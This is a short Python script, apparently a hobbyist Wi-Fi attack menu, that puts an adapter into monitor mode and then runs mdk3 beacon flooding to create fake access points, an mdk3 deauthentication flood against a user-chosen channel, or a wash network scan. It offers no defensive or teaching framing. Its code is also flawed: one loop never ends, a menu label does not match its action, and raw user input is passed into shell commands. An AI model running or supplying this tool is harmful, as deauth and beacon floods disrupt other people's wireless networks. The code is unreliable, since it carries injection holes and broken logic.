import os
import time
data1=input("""
``````````````````````````````````````````````````
``````````````````.`````````...```..``````````````
````````````syssyysyyyhhhhhhyyyysyyydo````````````
````````````h+``.+shmmmNMMMMNmhs/.``hs````````````
````````````yo:hNNNNNNNNNNMMMMMMMNy-hs.```````````
```````````.hdNNNmmNNNNMNMNNMMMMMMMNms````````````
````````````hhhMNNmdmNMNNMNNNmdmMMMhms````````````
```````````.hs-hssyo--+hNNho-:syssy:hs.```````````
``````````..dyommNNNmho+Nd+sdmNNNmdods.```````````
````````````hNNddm/..:hNmmNs-../NhNMNs-.``````````
````````````hNNNNddmhsNhmmddydmmmNNNNs.```````````
````````````hNmohNNNNmhNNMNhNMNMNsoNNs.```````````
```````````.hN:.+hdho:-+hy:-:+yhh/`/Ns.```````````
```````````.dm:```.```````````````.sms.```````````
````````````ho/yso+o:-:::::/-:++osh/yo.```````````
```````````.ho`oNmNNdo:...-:omNmNN+.ys.```````````
```````````.ho.-NNNNNNNNmNNNNNNNNd-.ys.```````````
````````````ho``/mNNNNNNNNmmmNNNh:..yo````````````
```````````.ho..`.+mNMNMmNNNmNd+....ys````````````
````````````hy+ooooodNNNmdmmNhoooo++do````````````
````````````-/s+::::::::-:s:::::/::::.````````````
`````````````ss.+o/s/os/::y.ooooy:s-y.````````````
`````````````//.//://///::o:///-//+s+.````````````
`````````````````````````````````.-.``````````````

1.Fake access points
2.Deauth
3.Scan networks
: """)
wlandata=input("What is your adapter example wlan0: ")

def monitormode():
    if ("mon" in wlandata):
        pass
    else:
        os.system("airmon-ng start " + wlandata)


monitormode()
print("Trying to ACTIVE monitormode if already in monitormode nothing will be done")
mondata=input("What is your monitormode adapter name? (example wlan0mon): ")


if (data1=="1"):
    print ("ACTIVE")
    xd=os.system("mdk3 " + mondata + " b -t xx:xx:xx:xx:xx:xx -c X")
    while xd<1000:
        xd + 50


elif(data1=="2"):
    print("Scanning networks")
    os.system("gnome-terminal -e 'bash -c \"wash -i " + mondata + "; bash\" '")
    time.sleep(5)
    channelinput=input("Give me a channel number: ")
    print("ACTIVE")
    os.system("mdk3 "+ mondata + " d -c " + channelinput)

elif(data1=="3"):
    os.system("gnome-terminal -e 'wash -i '" + mondata)





else:
    print ("choose from 1 to 3")
    pass
